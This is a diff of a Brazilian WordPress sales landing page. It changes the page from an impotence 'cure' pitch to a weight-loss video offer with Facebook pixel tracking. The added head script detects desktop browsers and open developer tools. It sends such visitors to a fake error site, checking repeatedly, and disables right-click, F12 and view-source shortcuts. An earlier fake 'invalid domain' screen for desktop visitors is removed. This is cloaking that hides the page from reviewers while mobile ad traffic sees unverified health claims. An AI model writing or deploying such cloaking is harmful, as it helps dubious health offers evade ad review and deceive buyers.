@@ -1,14 +1,121 @@
-<!DOCTYPE html><html lang="pt-PT"><head>
+<!DOCTYPE html><html lang="pt-BR"><head>
+	<head>
+<script>
+(function() {
+
+  const target = "https://erro-no-site.vercel.app/";
+
+  // Detectar se é mobile real
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+
+  // Função para detetar DevTools
+  function isDevToolsOpen() {
+    let opened = false;
+
+    // Método 1 - diferença normal entre outerHeight e innerHeight
+    if (window.outerHeight - window.innerHeight > 160) {
+      opened = true;
+    }
+
+    // Método 2 - largura anormal da janela por causa do device toolbar
+    if (window.outerWidth - window.innerWidth > 160) {
+      opened = true;
+    }
+
+    // Método 3 - atraso causado pelo "debugger"
+    const t0 = performance.now();
+    debugger;
+    const t1 = performance.now();
+    if (t1 - t0 > 200) {
+      opened = true;
+    }
+
+    return opened;
+  }
+
+
+  // ==========================================================
+  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) → BLOQUEAR
+  // ==========================================================
+  if (!isMobile) {   // só PC
+
+    // Se DevTools está aberto ANTES da página abrir → redireciona
+    if (isDevToolsOpen()) {
+      window.location.replace(target);
+    }
+
+    // Monitor contínuo — garante que qualquer tentativa é apanhada
+    setInterval(function() {
+      if (isDevToolsOpen()) {
+        window.location.replace(target);
+      }
+    }, 300);
+  }
+
+
+
+  // ======================
+  // JÁ EXISTIA: bloqueio total só para DESKTOP real
+  // ======================
+  if (!isMobile) {
+
+    try {
+      window.location.replace(target);
+    } catch (e) {
+      window.location.href = target;
+    }
+
+    // Bloqueio de clique direito
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    // Bloqueio de teclas
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123) return false; // F12
+      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
+      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
+    };
+
+    // DevTools detection (já existente)
+    setInterval(function() {
+      const start = performance.now();
+      debugger;
+      const end = performance.now();
+      if (end - start > 200) {
+        window.location.replace(target);
+      }
+    }, 500);
+
+    // Altura da janela (já existente)
+    setInterval(function() {
+      if (window.outerHeight - window.innerHeight > 160) {
+        window.location.replace(target);
+      }
+    }, 300);
+
+    return;
+  }
+
+
+  // ======================
+  // MOBILE REAL
+  // ======================
+  // Aqui não tocamos. Tudo normal.
+
+})();
+</script>
+</head>
 	<meta charset="UTF-8">
-			<title>Zero impotencia</title>
+			<title>Zero imopotencia</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="max-image-preview:large">
 	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
-	<title>Zero impotencia</title>
-<link rel="alternate" type="application/rss+xml" title="Programa � Feed" href="https://novociclo.online/programa/feed/">
-<link rel="alternate" type="application/rss+xml" title="Programa � Feed de comentários" href="https://novociclo.online/programa/comments/feed/">
+	<script type="application/javascript" id="pys-version-script">console.log('PixelYourSite Free version 11.0.1.2');</script>
+<title>Zero imopotencia</title>
+<link rel="alternate" type="application/rss+xml" title="Feed para novaestrategia.shop �" href="https://novaestrategia.shop/feed/">
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para novaestrategia.shop �" href="https://novaestrategia.shop/comments/feed/">
 <script>
-window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/novociclo.online\/programa\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.3"}};
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/novaestrategia.shop\/wp-includes\/js\/wp-emoji-release.min.js?ver=37b0346f0d1179f36fcb7d0ea86f5d0f"}};
 /*! This file is auto-generated */
 !function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
 </script>
@@ -63,34 +170,28 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 			z-index: 100000;
 		}
 </style>
-<link rel="stylesheet" id="qi-addons-for-elementor-grid-style-css" href="css/grid.min.css" media="all">
-<link rel="stylesheet" id="qi-addons-for-elementor-helper-parts-style-css" href="css/helper-parts.min.css" media="all">
-<link rel="stylesheet" id="qi-addons-for-elementor-style-css" href="css/main.min.css" media="all">
+<link rel="stylesheet" id="cmplz-general-css" href="css/cookieblocker.min.css" media="all">
 <link rel="stylesheet" id="twentytwentyfive-style-css" href="css/style.css" media="all">
-<link rel="stylesheet" id="swiper-css" href="css/swiper.min.css" media="all">
 <link rel="stylesheet" id="elementor-frontend-css" href="css/frontend.min.css" media="all">
-<link rel="stylesheet" id="elementor-post-10-css" href="css/post-10.css" media="all">
+<link rel="stylesheet" id="elementor-post-5-css" href="css/post-5.css" media="all">
 <link rel="stylesheet" id="widget-heading-css" href="css/widget-heading.min.css" media="all">
-<link rel="stylesheet" id="e-animation-pulse-css" href="css/e-animation-pulse.min.css" media="all">
-<link rel="stylesheet" id="e-animation-pulse-grow-css" href="css/e-animation-pulse-grow.min.css" media="all">
-<link rel="stylesheet" id="elementor-post-322-css" href="css/post-322.css" media="all">
-<link rel="stylesheet" id="master-addons-main-style-css" href="css/master-addons-styles.css" media="all">
-<link rel="stylesheet" id="eael-general-css" href="css/general.min.css" media="all">
+<link rel="stylesheet" id="widget-image-css" href="css/widget-image.min.css" media="all">
+<link rel="stylesheet" id="elementor-post-393-css" href="css/post-393.css" media="all">
 <link rel="stylesheet" id="elementor-gf-local-roboto-css" href="css/roboto.css" media="all">
 <link rel="stylesheet" id="elementor-gf-local-robotoslab-css" href="css/robotoslab.css" media="all">
-<script id="jquery-core-js-before">
-/* < ![CDATA[ */
-function jltmaNS(n){for(var e=n.split("."),a=window,i="",r=e.length,t=0;r>t;t++)"window"!=e[t]&&(i=e[t],a[i]=a[i]||{},a=a[i]);return a;}
-/* ]]> */
-</script>
 <script src="js/jquery.min.js" id="jquery-core-js"></script>
 <script src="js/jquery-migrate.min.js" id="jquery-migrate-js"></script>
-<link rel="https://api.w.org/" href="https://novociclo.online/programa/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://novociclo.online/programa/wp-json/wp/v2/pages/322"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://novociclo.online/programa/xmlrpc.php?rsd">
-<meta name="generator" content="WordPress 6.8.3">
-<link rel="canonical" href="https://novociclo.online/programa/pag-02/">
-<link rel="shortlink" href="https://novociclo.online/programa/?p=322">
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://novociclo.online/programa/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnovociclo.online%2Fprograma%2Fpag-02%2F">
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://novociclo.online/programa/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnovociclo.online%2Fprograma%2Fpag-02%2F&format=xml">
+<script src="js/jquery.bind-first-0.2.3.min.js" id="jquery-bind-first-js"></script>
+<script src="js/js.cookie-2.1.3.min.js" id="js-cookie-pys-js"></script>
+<script src="js/tld.min.js" id="js-tld-js"></script>
+<script id="pys-js-extra">
+var pysOptions = {"staticEvents":{"facebook":{"init_event":[{"delay":0,"type":"static","ajaxFire":false,"name":"PageView","pixelIds":["1397684491501570"],"eventID":"11f7900a-486b-40e6-a1c9-0e11c333df6a","params":{"page_title":"truque-1","post_type":"page","post_id":393,"plugin":"PixelYourSite","user_role":"guest","event_url":"novaestrategia.shop\/emagrece\/"},"e_id":"init_event","ids":[],"hasTimeWindow":false,"timeWindow":0,"woo_order":"","edd_order":""}]}},"dynamicEvents":[],"triggerEvents":[],"triggerEventTypes":[],"facebook":{"pixelIds":["1397684491501570"],"advancedMatching":[],"advancedMatchingEnabled":false,"removeMetadata":true,"wooVariableAsSimple":false,"serverApiEnabled":false,"wooCRSendFromServer":false,"send_external_id":null,"enabled_medical":false,"do_not_track_medical_param":["event_url","post_title","page_title","landing_page","content_name","categories","category_name","tags"],"meta_ldu":false},"debug":"","siteUrl":"https:\/\/novaestrategia.shop","ajaxUrl":"https:\/\/novaestrategia.shop\/wp-admin\/admin-ajax.php","ajax_event":"9d2d7f20b0","enable_remove_download_url_param":"1","cookie_duration":"7","last_visit_duration":"60","enable_success_send_form":"","ajaxForServerEvent":"1","ajaxForServerStaticEvent":"1","send_external_id":"1","external_id_expire":"180","track_cookie_for_subdomains":"1","google_consent_mode":"1","gdpr":{"ajax_enabled":false,"all_disabled_by_api":false,"facebook_disabled_by_api":false,"analytics_disabled_by_api":false,"google_ads_disabled_by_api":false,"pinterest_disabled_by_api":false,"bing_disabled_by_api":false,"externalID_disabled_by_api":false,"facebook_prior_consent_enabled":true,"analytics_prior_consent_enabled":true,"google_ads_prior_consent_enabled":null,"pinterest_prior_consent_enabled":true,"bing_prior_consent_enabled":true,"cookiebot_integration_enabled":false,"cookiebot_facebook_consent_category":"marketing","cookiebot_analytics_consent_category":"statistics","cookiebot_tiktok_consent_category":"marketing","cookiebot_google_ads_consent_category":"marketing","cookiebot_pinterest_consent_category":"marketing","cookiebot_bing_consent_category":"marketing","consent_magic_integration_enabled":false,"real_cookie_banner_integration_enabled":false,"cookie_notice_integration_enabled":false,"cookie_law_info_integration_enabled":false,"analytics_storage":{"enabled":true,"value":"granted","filter":false},"ad_storage":{"enabled":true,"value":"granted","filter":false},"ad_user_data":{"enabled":true,"value":"granted","filter":false},"ad_personalization":{"enabled":true,"value":"granted","filter":false}},"cookie":{"disabled_all_cookie":false,"disabled_start_session_cookie":false,"disabled_advanced_form_data_cookie":false,"disabled_landing_page_cookie":false,"disabled_first_visit_cookie":false,"disabled_trafficsource_cookie":false,"disabled_utmTerms_cookie":false,"disabled_utmId_cookie":false},"tracking_analytics":{"TrafficSource":"m.facebook.com","TrafficLanding":"undefined","TrafficUtms":[],"TrafficUtmsId":[]},"GATags":{"ga_datalayer_type":"default","ga_datalayer_name":"dataLayerPYS"},"woo":{"enabled":false},"edd":{"enabled":false},"cache_bypass":"1765057311"};
+</script>
+<script src="js/public.js" id="pys-js"></script>
+<link rel="https://api.w.org/" href="https://novaestrategia.shop/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://novaestrategia.shop/wp-json/wp/v2/pages/393"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://novaestrategia.shop/xmlrpc.php?rsd">
+<link rel="canonical" href="https://novaestrategia.shop/emagrece/">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://novaestrategia.shop/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnovaestrategia.shop%2Femagrece%2F">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://novaestrategia.shop/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnovaestrategia.shop%2Femagrece%2F&format=xml">
 <meta name="generator" content="Elementor 3.30.4; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
 			<style>
 				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
@@ -115,124 +216,77 @@ function jltmaNS(n){for(var e=n.split("."),a=window,i="",r=e.length,t=0;r>t;t++)
 @font-face{font-family:"Fira Code";font-style:normal;font-weight:300 700;font-display:fallback;src:url('fonts/FiraCode-VariableFont_wght.woff2') format('woff2');}
 </style>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"></head>
-<body class="wp-singular page-template page-template-elementor_canvas page page-id-322 wp-embed-responsive wp-theme-twentytwentyfive qodef-qi--touch qi-addons-for-elementor-1.9.5 elementor-default elementor-template-canvas elementor-kit-10 elementor-page elementor-page-322">
-			<div data-elementor-type="wp-page" data-elementor-id="322" class="elementor elementor-322">
-				<div class="elementor-element elementor-element-fcc4c75 e-flex e-con-boxed e-con e-parent" data-id="fcc4c75" data-element_type="container" data-settings="{" background_background":"gradient"}"="">
+<body data-rsssl="1" class="wp-singular page-template page-template-elementor_canvas page page-id-393 wp-embed-responsive wp-theme-twentytwentyfive elementor-default elementor-template-canvas elementor-kit-5 elementor-page elementor-page-393">
+			<div data-elementor-type="wp-page" data-elementor-id="393" class="elementor elementor-393" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-96c5a75 e-flex e-con-boxed e-con e-parent" data-id="96c5a75" data-element_type="container">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-fa7ccc1 jltma-glass-effect-no elementor-widget elementor-widget-heading" data-id="fa7ccc1" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default">🔞</h2>				</div>
-				<div class="elementor-element elementor-element-9855541 jltma-glass-effect-no elementor-widget elementor-widget-html" data-id="9855541" data-element_type="widget" data-widget_type="html.default">
-					<script>
-  function isMobile() {
-    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-  }
-
-  if (!isMobile()) {
-    // Se não for mobile, mostra a mensagem de bloqueio
-    document.documentElement.innerHTML = ""; // Limpa tudo, incluindo <head> e <body>
-
-    const style = document.createElement("style");
-    style.innerHTML = `
-      html, body {
-        margin: 0;
-        padding: 0;
-        background: #ffffff;
-        height: 100%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-family: Arial, sans-serif;
-        text-align: center;
-        color: #000000;
-      }
-    `;
-
-    const message = document.createElement("div");
-    message.innerHTML = `
-      <div>
-        <h1 style="font-size: 24px;">⚠ Domínio Inválido</h1>
-        <p style="font-size: 18px;">O site que você está tentando acessar está indisponível no momento.</p>
-        <p style="font-size: 18px;">Tente novamente mais tarde.</p>
-      </div>
-    `;
-
-    document.head.appendChild(style);
-    document.body.appendChild(message);
-  }
-</script>				</div>
-				<div class="elementor-element elementor-element-a801973 jltma-glass-effect-no elementor-widget elementor-widget-html" data-id="a801973" data-element_type="widget" data-widget_type="html.default">
-					<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1397684491501570');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->				</div>
-				<div class="elementor-element elementor-element-4109e31 elementor-widget-mobile__width-inherit jltma-glass-effect-no elementor-widget elementor-widget-html" data-id="4109e31" data-element_type="widget" data-widget_type="html.default">
-					<vturb-smartplayer id="vid-693195be8f0253bca664928d" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/d988c7ae-bfd7-4ff0-996f-a71db59f6dd1/players/693195be8f0253bca664928d/v4/player.js", s.async=!0,document.head.appendChild(s); </script>				</div>
-				<div class="elementor-element elementor-element-57ef6a8a elementor-align-center delay elementor-mobile-align-center jltma-glass-effect-no elementor-invisible elementor-widget elementor-widget-button" data-id="57ef6a8a" data-element_type="widget" data-settings="{" _animation":"pulse"}"="" data-widget_type="button.default">
-										<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-pulse-grow" href="https://ckeckout-zero-impotencia.vercel.app" target="_blank">
-						<span class="elementor-button-content-wrapper">
-									<span class="elementor-button-text">«Quero Curar Minha Disfunção»</span>
-					</span>
-					</a>
-								</div>
-				<div class="elementor-element elementor-element-39e33d39 jltma-glass-effect-no elementor-widget elementor-widget-html" data-id="39e33d39" data-element_type="widget" data-widget_type="html.default">
+				<div class="elementor-element elementor-element-67a7414 elementor-widget elementor-widget-html" data-id="67a7414" data-element_type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
 					
 
 
-  <meta charset="UTF-8">
-  <title>Delay de Exibição</title>
-  <script src="js/jquery.min_1.js"></script>
-  <style>
-    .delay {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adicionar Pixel</title>
+    <!-- Código do Facebook Pixel -->
+    <script>
+        !function(f,b,e,v,n,t,s) {
+            if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];
+            t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s);
+        }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1397684491501570'); // Seu Pixel ID
+        fbq('track', 'PageView'); // Evento de visualização de página
+    </script>
 
 
-
-  <!-- Botão ou conteúdo que só será exibido após o tempo -->
-  <div class="delay">
-    <button></button>
-  </div>
-
-  <script>
-    $(document).ready(function () {
-      setTimeout(function () {
-        $('.delay').fadeIn(); // aparece suavemente
-      }, 1530000); // 25 minutos e 30 segundos em milissegundos
-    });
-  </script>
+    <!-- O corpo da página vai aqui -->
 
 
-
+				</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-52d882b5 e-flex e-con-boxed e-con e-parent" data-id="52d882b5" data-element_type="container" data-settings="{" background_background":"gradient"}"="">
+		<div class="elementor-element elementor-element-eed1b5a e-flex e-con-boxed e-con e-parent" data-id="eed1b5a" data-element_type="container" data-settings="{" background_background":"classic"}"="">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-12ec6180 jltma-glass-effect-no elementor-widget elementor-widget-heading" data-id="12ec6180" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default"><b>Este site não é afiliado ao Facebook ou a qualquer entidade do Facebook. </b></h2>				</div>
-				<div class="elementor-element elementor-element-28191b1a jltma-glass-effect-no elementor-widget elementor-widget-heading" data-id="28191b1a" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default"><a href="https://dev-gastronomia-fitness-emagrecer.pantheonsite.io/politicas-de-privacidade/" target="_blank"><b>Política de Privacidade | Termos de Uso</b></a></h2>				</div>
-				<div class="elementor-element elementor-element-6170681e jltma-glass-effect-no elementor-widget elementor-widget-heading" data-id="6170681e" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default">PROTOCOLO POTÊNCIA SEXUAL ® 2025. Todos os Direitos Reservados</h2>				</div>
+				<div class="elementor-element elementor-element-09b380b elementor-widget elementor-widget-heading" data-id="09b380b" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">NOTÍCIAS</h2>				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-500c50a e-flex e-con-boxed e-con e-parent" data-id="500c50a" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-fdfe57e elementor-widget-mobile__width-inherit elementor-widget elementor-widget-image" data-id="fdfe57e" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+														</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-d0aa54a e-flex e-con-boxed e-con e-parent" data-id="d0aa54a" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-ff6381f elementor-widget-mobile__width-inherit elementor-widget elementor-widget-html" data-id="ff6381f" data-element_type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<vturb-smartplayer  id="vid-69388a93b55680ab1eed2622" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/0bf67b44-cfcf-437f-870b-b214486f5454/players/69388a93b55680ab1eed2622/v4/player.js", s.async=!0,document.head.appendChild(s); </script>				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-56566a0 e-flex e-con-boxed e-con e-parent" data-id="56566a0" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-a2861bf elementor-widget elementor-widget-heading" data-id="a2861bf" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h5 class="elementor-heading-title elementor-size-default">Por favor, verifique o seu som 🔈</h5>				</div>
+				</div>
+				<div class="elementor-element elementor-element-94a08c8 elementor-widget elementor-widget-image" data-id="94a08c8" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="1024" height="137" src="images/EMAGRECER-1.webp" class="attachment-large size-large wp-image-402" alt="" srcset="images/EMAGRECER-1.webp 1024w, images/EMAGRECER-1-300x40.webp 300w, images/EMAGRECER-1-768x103.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px">															</div>
+				</div>
 					</div>
 				</div>
 				</div>
 		<script type="speculationrules">
-{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/programa\/*"},{"not":{"href_matches":["\/programa\/wp-*.php","\/programa\/wp-admin\/*","\/programa\/wp-content\/uploads\/*","\/programa\/wp-content\/*","\/programa\/wp-content\/plugins\/*","\/programa\/wp-content\/themes\/twentytwentyfive\/*","\/programa\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/twentytwentyfive\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
 </script>
 			<script>
 				const lazyloadRunObserver = () => {
@@ -260,7 +314,8 @@ src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
 					document.addEventListener( event, lazyloadRunObserver );
 				} );
 			</script>
-			<script id="wp-block-template-skip-link-js-after">
+			<noscript><img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1&cd%5Bpage_title%5D=truque-1&cd%5Bpost_type%5D=page&cd%5Bpost_id%5D=393&cd%5Bplugin%5D=PixelYourSite&cd%5Buser_role%5D=guest&cd%5Bevent_url%5D=novaestrategia.shop%2Femagrece%2F" alt=""></noscript>
+<script id="wp-block-template-skip-link-js-after">
 	( function() {
 		var skipLinkTarget = document.querySelector( 'main' ),
 			sibling,
@@ -295,49 +350,35 @@ src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
 		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
 		skipLink.id = 'wp-skip-link';
 		skipLink.href = '#' + skipLinkTargetID;
-		skipLink.innerText = 'Saltar para o conteúdo';
+		skipLink.innerText = 'Pular para o conteúdo';
 
 		// Inject the skip link.
 		sibling.parentElement.insertBefore( skipLink, sibling );
 	}() );
 	
 </script>
-<script src="js/core.min.js" id="jquery-ui-core-js"></script>
-<script id="qi-addons-for-elementor-script-js-extra">
-var qodefQiAddonsGlobal = {"vars":{"adminBarHeight":0,"iconArrowLeft":"<svg  xmlns=\"http:\/\/www.w3.org\/2000\/svg\" x=\"0px\" y=\"0px\" viewBox=\"0 0 34.2 32.3\" xml:space=\"preserve\" style=\"stroke-width: 2;\"><line x1=\"0.5\" y1=\"16\" x2=\"33.5\" y2=\"16\"\/><line x1=\"0.3\" y1=\"16.5\" x2=\"16.2\" y2=\"0.7\"\/><line x1=\"0\" y1=\"15.4\" x2=\"16.2\" y2=\"31.6\"\/><\/svg>","iconArrowRight":"<svg  xmlns=\"http:\/\/www.w3.org\/2000\/svg\" x=\"0px\" y=\"0px\" viewBox=\"0 0 34.2 32.3\" xml:space=\"preserve\" style=\"stroke-width: 2;\"><line x1=\"0\" y1=\"16\" x2=\"33\" y2=\"16\"\/><line x1=\"17.3\" y1=\"0.7\" x2=\"33.2\" y2=\"16.5\"\/><line x1=\"17.3\" y1=\"31.6\" x2=\"33.5\" y2=\"15.4\"\/><\/svg>","iconClose":"<svg  xmlns=\"http:\/\/www.w3.org\/2000\/svg\" x=\"0px\" y=\"0px\" viewBox=\"0 0 9.1 9.1\" xml:space=\"preserve\"><g><path d=\"M8.5,0L9,0.6L5.1,4.5L9,8.5L8.5,9L4.5,5.1L0.6,9L0,8.5L4,4.5L0,0.6L0.6,0L4.5,4L8.5,0z\"\/><\/g><\/svg>"}};
-</script>
-<script src="js/main.min.js" id="qi-addons-for-elementor-script-js"></script>
 <script src="js/webpack.runtime.min.js" id="elementor-webpack-runtime-js"></script>
 <script src="js/frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
+<script src="js/core.min.js" id="jquery-ui-core-js"></script>
 <script id="elementor-frontend-js-before">
